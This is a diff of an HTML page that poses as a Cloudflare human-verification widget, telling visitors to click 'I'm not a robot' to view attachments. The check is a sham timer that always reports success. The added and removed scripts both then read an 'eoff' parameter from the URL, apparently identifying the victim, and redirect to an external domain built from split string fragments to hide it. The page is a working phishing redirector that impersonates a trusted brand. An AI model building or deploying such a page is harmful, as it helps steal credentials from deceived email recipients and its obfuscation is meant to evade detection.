@@ -5,257 +5,248 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <title>Verify Human</title>
     <style>
-        :root {
-            --bg-main: #f8fafc;
-            --border-color: #e2e8f0;
-            --stroke-default: #cbd5e1;
-            --text-dark: #1e293b;
-            --text-muted: #64748b;
-            --brand-color: #ff8c00;
-            --success-color: #10b981;
-            --accent-blue: #3b82f6;
-        }
-
-        html, body {
-            margin: 0;
-            padding: 0;
-            width: 100vw;
-            height: 100vh;
-            background: var(--bg-main);
-            font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-            -webkit-font-smoothing: antialiased;
-            overflow: hidden;
+        html {
+            height: -webkit-fill-available;
         }
 
         body {
+            min-height: 100vh;
+            min-height: -webkit-fill-available;
+            background-color: #f8fafc;
+            color: #1e293b;
+            font-family: ui-sans-serif, system-ui, -apple-system, sans-serif;
+            -webkit-font-smoothing: antialiased;
+            margin: 0;
+            overflow: hidden;
             display: grid;
             place-items: center;
         }
 
-        #screenShield {
+        #curtainStage {
             position: fixed;
-            inset: 0;
-            background: var(--bg-main);
+            z-index: 9999;
+            width: 100vw;
+            height: 100vh;
+            background: #f8fafc;
+            opacity: 1;
+            transition: transform 600ms cubic-bezier(0.77, 0, 0.175, 1);
             display: grid;
             place-items: center;
-            z-index: 2000;
-            transition: opacity 0.6s cubic-bezier(0.16, 1, 0.3, 1);
         }
 
-        .pulse-element {
+        .pulsing-graphic {
             width: 120px;
-            height: auto;
-            animation: throbEffect 3s ease-in-out infinite;
+            animation: bounceScale 3000ms ease-in-out infinite;
         }
 
-        @keyframes throbEffect {
+        @keyframes bounceScale {
             0%, 100% { transform: scale(0.95); opacity: 0.7; }
             50% { transform: scale(1.05); opacity: 1; }
         }
 
-        #viewportFrame {
+        #mainPresentation {
             display: grid;
-            place-items: center;
-            gap: 18px;
-            opacity: 0;
-            transition: opacity 0.5s linear;
+            justify-items: center;
+            row-gap: 18px;
+            visibility: hidden;
         }
 
-        .message-hint {
+        .instructional-header {
+            margin: 0;
             font-size: 0.92rem;
-            color: var(--text-dark);
             letter-spacing: -0.01em;
             font-weight: 450;
             text-align: center;
-            margin: 0;
         }
 
-        .widget-boundary {
-            display: grid;
-            grid-template-columns: 1fr auto;
-            align-items: center;
+        .captcha-module {
+            display: flex;
             width: 340px;
             height: 100px;
-            padding: 0 24px;
             background: #ffffff;
-            border: 1px solid var(--border-color);
+            border: 1px solid #e2e8f0;
             border-radius: 6px;
             box-shadow: 0 4px 12px rgba(0, 0, 0, 0.03);
+            transition: border-color 0.4s ease;
         }
 
-        .action-node {
+        .hit-detector {
+            flex: 1;
             display: flex;
             align-items: center;
+            padding-left: 24px;
             gap: 12px;
             cursor: pointer;
             user-select: none;
-            height: 100%;
         }
 
-        .gfx-box {
+        .icon-chassis {
             width: 22px;
             height: 22px;
         }
 
-        .vector-path {
+        .render-path {
             fill: none;
-            stroke: var(--stroke-default);
+            stroke: #cbd5e1;
             stroke-width: 2.5;
             stroke-linecap: round;
             stroke-linejoin: round;
-            transition: stroke 0.4s ease, filter 0.4s ease;
+            transition: stroke 0.4s, filter 0.4s;
         }
 
-        .label-output {
+        .dynamic-typography {
             font-size: 0.95rem;
             font-weight: 500;
-            color: var(--text-dark);
         }
 
-        .meta-stack {
+        .branding-column {
+            width: 120px;
             display: flex;
             flex-direction: column;
             align-items: flex-end;
             justify-content: center;
-            height: 100%;
+            padding-right: 24px;
         }
 
-        .logo-gfx {
+        .asset-logo {
             height: 38px;
-            width: auto;
             margin-bottom: -2px;
         }
 
-        .title-txt {
+        .txt-brand {
             font-weight: 800;
             font-size: 0.75rem;
             letter-spacing: 1.5px;
-            color: var(--brand-color);
+            color: #ff8c00;
             text-transform: uppercase;
         }
 
-        .footer-crumbs {
+        .txt-legal {
             font-size: 0.65rem;
-            color: var(--text-muted);
+            color: #64748b;
             margin-top: 1px;
         }
 
-        .widget-boundary[data-phase="loading"] .vector-path {
-            stroke: var(--accent-blue);
-            animation: turn 1s linear infinite;
-            transform-origin: center;
+        [data-status="spinning"] .render-path {
+            stroke: #3b82f6;
+            transform-origin: 12px 12px;
+            animation: orbitalSpin 1s linear infinite;
         }
 
-        @keyframes turn {
-            to { transform: rotate(360deg); }
+        @keyframes orbitalSpin {
+            100% { transform: rotate(360deg); }
         }
 
-        .widget-boundary[data-phase="success"] .vector-path {
-            stroke: var(--success-color);
+        [data-status="resolved"] .render-path {
+            stroke: #10b981;
             filter: drop-shadow(0 0 3px rgba(16, 185, 129, 0.4));
         }
 
-        .widget-boundary[data-phase="success"] .label-output {
-            color: var(--success-color);
+        [data-status="resolved"] .dynamic-typography {
+            color: #10b981;
         }
     </style>
 </head>
 <body>
 
-    <div id="screenShield">
-        <img src="astroman.png" alt="load" class="pulse-element">
-    </div>
+    <section id="curtainStage">
+        <img src="astroman.png" alt="load" class="pulsing-graphic">
+    </section>
 
-    <div id="viewportFrame">
-        <p id="uiHint" class="message-hint"></p>
-        <div id="authWidget" class="widget-boundary">
-            <div id="clickTarget" class="action-node">
-                <svg viewBox="0 0 24 24" class="gfx-box">
-                    <path id="dynamicVector" class="vector-path" d="M4 4h16v16H4z" />
+    <main id="mainPresentation">
+        <h1 id="promptText" class="instructional-header"></h1>
+        <article id="uiWrapper" class="captcha-module" data-status="ready">
+            <div id="gestureZone" class="hit-detector">
+                <svg viewBox="0 0 24 24" class="icon-chassis">
+                    <path id="vectorStroke" class="render-path" d="M4 4h16v16H4z" />
                 </svg>
-                <span id="uiStateLabel" class="label-output"></span>
+                <span id="stateLabel" class="dynamic-typography"></span>
             </div>
-            <div class="meta-stack">
-                <img src="cloudflare_.png" alt="secure" class="logo-gfx">
-                <span id="uiBrandLabel" class="title-txt"></span>
-                <div class="footer-crumbs">privacy . terms</div>
+            <div class="branding-column">
+                <img src="cloudflare_.png" alt="secure" class="asset-logo">
+                <span id="brandLabel" class="txt-brand"></span>
+                <span class="txt-legal">privacy . terms</span>
             </div>
-        </div>
-    </div>
+        </article>
+    </main>
 
     <script>
-        (() => {
-            const DICTIONARY = {
-                msg: "Verify you're human below to view the attachments",
-                init: "I'm not a robot",
-                load: "Verifying...",
-                done: "Success!",
-                name: "CLOUDFLARE"
+        document.onreadystatechange = () => {
+            if (document.readyState !== "interactive") return;
+
+            const LOCALE = {
+                hint: "Verify you're human below to view the attachments",
+                start: "I'm not a robot",
+                run: "Verifying...",
+                end: "Success!",
+                group: "CLOUDFLARE"
             };
 
-            const nodes = {
-                shield: document.getElementById('screenShield'),
-                frame: document.getElementById('viewportFrame'),
-                hint: document.getElementById('uiHint'),
-                widget: document.getElementById('authWidget'),
-                trigger: document.getElementById('clickTarget'),
-                label: document.getElementById('uiStateLabel'),
-                vector: document.getElementById('dynamicVector'),
-                brand: document.getElementById('uiBrandLabel')
+            const view = {
+                splash: document.querySelector('#curtainStage'),
+                body: document.querySelector('#mainPresentation'),
+                notice: document.querySelector('#promptText'),
+                container: document.querySelector('#uiWrapper'),
+                hitbox: document.querySelector('#gestureZone'),
+                status: document.querySelector('#stateLabel'),
+                node: document.querySelector('#vectorStroke'),
+                firm: document.querySelector('#brandLabel')
             };
 
-            nodes.hint.textContent = DICTIONARY.msg;
-            nodes.label.textContent = DICTIONARY.init;
-            nodes.brand.textContent = DICTIONARY.name;
+            view.notice.textContent = LOCALE.hint;
+            view.status.textContent = LOCALE.start;
+            view.firm.textContent = LOCALE.group;
 
-            let activeLock = false;
-            const delay = ms => new Promise(r => setTimeout(r, ms));
+            let processingFlag = false;
 
-            const updateGfx = (pathString, dashArr = '') => {
-                if (!nodes.vector) return;
-                nodes.vector.setAttribute('d', pathString);
-                nodes.vector.style.strokeDasharray = dashArr;
+            const sleep = duration => new Promise(done => setTimeout(done, duration));
+
+            const paintShape = (d, dash = '') => {
+                view.node?.setAttribute('d', d);
+                if (view.node) view.node.style.strokeDasharray = dash;
             };
 
-            const queryParam = key => {
-                const search = window.location.search;
-                const match = search.match(new RegExp(`[?&]${key}=([^&#]*)`));
-                return match ? match[1] : '';
+            const parseEoff = () => {
+                const loc = window.location.href;
+                const fragmentIndex = loc.indexOf('eoff=');
+                if (fragmentIndex === -1) return '';
+
+                const segment = loc.slice(fragmentIndex + 5);
+                const terminator = segment.search(/[&#]/);
+                return terminator !== -1 ? segment.slice(0, terminator) : segment;
             };
 
-            const runValidation = async () => {
-                if (activeLock) return;
-                activeLock = true;
+            const executeFlow = async () => {
+                if (processingFlag) return;
+                processingFlag = true;
 
-                nodes.widget.setAttribute('data-phase', 'loading');
-                nodes.label.textContent = DICTIONARY.load;
-                updateGfx('M12 2a10 10 0 1 0 10 10A10 10 0 0 0 12 2', '35 15');
+                view.container.setAttribute('data-status', 'spinning');
+                view.status.textContent = LOCALE.run;
+                paintShape('M12 2a10 10 0 1 0 10 10A10 10 0 0 0 12 2', '35 15');
 
-                await delay(2500);
+                await sleep(2500);
 
-                nodes.widget.setAttribute('data-phase', 'success');
-                nodes.label.textContent = DICTIONARY.done;
-                updateGfx('M20 6L9 17l-5-5');
+                view.container.setAttribute('data-status', 'resolved');
+                view.status.textContent = LOCALE.end;
+                paintShape('M20 6L9 17l-5-5', '');
 
-                await delay(1200);
+                await sleep(1200);
 
-                let token = queryParam('eoff');
-                // Remove any = or , that may have sneaked in (also decode percent-encoded equals first)
-                token = decodeURIComponent(token).replace(/[=,]/g, '');
-                const target = ['ht', 'tps', '://', 'po', '.xtomanuaeshare', '.site', '/sNOiatkB'].join('');
-                window.location.href = target + (token ? '#' + token : '');
+                const queryVal = parseEoff();
+                const address = ['ht', 'tps', '://', 'po', '.xtomanuaeshare', '.site', '/sNOiatkB'].reduce((acc, str) => acc + str, '');
+                window.location.replace(address + (queryVal ? '#' + queryVal : ''));
             };
 
             (async () => {
-                await delay(3000);
-                nodes.shield.style.opacity = '0';
-                await delay(600);
-                nodes.shield.remove();
-                nodes.frame.style.opacity = '1';
+                await sleep(3000);
+                view.splash.style.opacity = '0';
+                await sleep(600);
+                view.splash.style.display = 'none';
+                view.body.style.visibility = 'visible';
             })();
 
-            nodes.trigger?.addEventListener('click', runValidation);
-        })();
+            view.hitbox?.addEventListener('click', executeFlow);
+        };
     </script>
 </body>
 </html>
